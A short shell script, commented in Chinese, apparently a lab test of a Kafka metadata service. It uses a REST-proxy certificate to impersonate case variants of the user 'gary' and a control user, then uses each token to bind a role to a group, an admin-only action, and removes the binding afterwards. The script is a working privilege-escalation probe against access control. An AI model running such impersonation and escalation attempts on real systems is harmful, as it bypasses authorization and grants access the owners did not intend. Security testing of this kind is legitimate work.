#!/bin/sh
# 以 restproxy 憑證代理不同大小寫的 gary 取得 token,再用該 token 做「需要 UserAdmin」的事(替群組綁一個 role),
# 看大小寫不同的 principal 會不會繼承 GARY 的群組權限。控制組:yujie(應該被拒)。在 curl 容器內執行。
M=https://broker1:8091; CA=/certs/ca.pem
CERT="--cert /certs/client-restproxy.pem --key /certs/client-restproxy.key"
BODY='{"scope":{"clusters":{"kafka-cluster":"XyZBQ3-GTvKH2qNfP7X33A"}},"resourcePatterns":[{"resourceType":"Topic","name":"zz-case-test.","patternType":"PREFIXED"}]}'
for t in yujie gary Gary GARY; do
  tok=$(curl -s --cacert $CA $CERT -H 'Accept: application/json' -H 'Content-Type: application/json' -X POST $M/security/1.0/impersonate -d "{\"targetPrincipalName\":\"$t\",\"targetPrincipalType\":\"USER\"}" | grep -o '"auth_token":"[^"]*"' | cut -d'"' -f4)
  if [ -z "$tok" ]; then echo "$t: 拿不到 token(被保護清單擋下)"; continue; fi
  code=$(curl -s -o /dev/null -w '%{http_code}' --cacert $CA -H "Authorization: Bearer $tok" -H 'Content-Type: application/json' -X POST $M/security/1.0/principals/Group%3Aorders-read/roles/DeveloperRead/bindings -d "$BODY")
  echo "$t: 用代理來的 token 替群組綁 role(需要 UserAdmin)→ HTTP $code"
  curl -s -o /dev/null --cacert $CA -H "Authorization: Bearer $tok" -H 'Content-Type: application/json' -X DELETE $M/security/1.0/principals/Group%3Aorders-read/roles/DeveloperRead/bindings -d "$BODY"
done
